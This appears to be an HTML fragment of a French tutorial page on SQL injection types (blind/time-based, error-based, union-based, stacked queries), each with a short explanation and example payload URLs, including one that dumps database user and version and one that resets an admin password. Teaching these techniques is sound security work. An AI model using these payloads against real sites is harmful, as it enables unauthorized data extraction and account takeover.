<h1>Types d'injections (méthodes)</h1>

<div class="row">
    <div class="col-12 accordion" id="accordionExample">
        <div class="card">
            <div class="card-header" id="headingTwo">
                <button class="btn btn-link collapsed" type="button" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
                    <h5 class="mb-0 ml-2">Blind Based et time based</h5>
                </button>
            </div>
            <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionExample">
                <div class="card-body">
                    <p>Consiste à effectuer une série de tests "a l'aveugle" afin de déterminer des informations clés sur le serveur avec des requêtes retournant vrai ou faux. </p>
                    <blockquote>
                        http://newspaper.com/items.php?id=2<span class="red"> and 1=1</span>
                    </blockquote>
                    <blockquote>
                        http://www.site.com/vulnerable.php?id=1<span class="red">' waitfor delay '00:00:10'--</span>
                    </blockquote>
                </div>
            </div>
        </div>
        <div class="card">
            <div class="card-header" id="headingThree">
                <button class="btn btn-link collapsed" type="button" data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                    <h5 class="mb-0 ml-2">Error Based</h5>
                </button>
            </div>
            <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordionExample">
                <div class="card-body">
                    <p>L'attaquant se base sur les messages d'erreurs du serveur pour soutirer des informations sur les données, les colonnes, les contraintes...</p>
                    <blockquote>http://testphp.vulnweb.com/listproducts.php?cat=1<span class="red">'</span></blockquote>
                    <img src="./img/error-based.png">
                </div>
            </div>
        </div>
        <div class="card">
            <div class="card-header" id="headingFour">
                <button class="btn btn-link collapsed" type="button" data-toggle="collapse" data-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
                    <h5 class="mb-0 ml-2">Union Based</h5>
                </button>
            </div>
            <div id="collapseFour" class="collapse" aria-labelledby="headingFour" data-parent="#accordionExample">
                <div class="card-body">
                    <p>Permet de concaténer une requête à la suite d'une autre avec le mot clé UNION.</p>
                    <blockquote>http://mondomaine.com/lapageweb.php?id=3<span class="red">+UNION+SELECT+CONCAT_WS(CHAR(32,58,32),user(),database(),version())</span></blockquote>
                </div>
            </div>
        </div>
        <div class="card">
            <div class="card-header" id="headingFive">
                <button class="btn btn-link collapsed" type="button" data-toggle="collapse" data-target="#collapseFive" aria-expanded="false" aria-controls="collapseFive">
                    <h5 class="mb-0 ml-2">Stacked Queries</h5>
                </button>
            </div>
            <div id="collapseFive" class="collapse" aria-labelledby="headingFive" data-parent="#accordionExample">
                <div class="card-body">
                    <p>Permet de concaténer des requêtes avec un point-virgule.</p>
                    <blockquote>
                        http://site.com/vulnerable.php?cat=1<span class="red">; UPDATE members SET password='pwd' WHERE username='admin'</span>
                    </blockquote>
                    <blockquote>
                    SELECT * FROM products WHERE categoryid=1<span class="red">; UPDATE members SET password='pwd' WHERE username='admin'</span>
                    </blockquote>
                </div>
            </div>
        </div>
    </div>
</div>